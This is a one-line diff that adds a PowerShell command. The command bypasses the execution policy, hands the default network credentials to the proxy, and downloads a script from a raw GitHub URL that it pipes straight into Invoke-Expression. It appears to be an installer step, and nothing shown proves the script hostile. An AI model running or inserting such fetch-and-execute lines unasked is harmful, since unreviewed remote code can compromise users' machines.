@@ -1,0 +1,1 @@
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://raw.githubusercontent.com/evil-shrike/scripts/master/samples/install_tools.ps1')|iex"
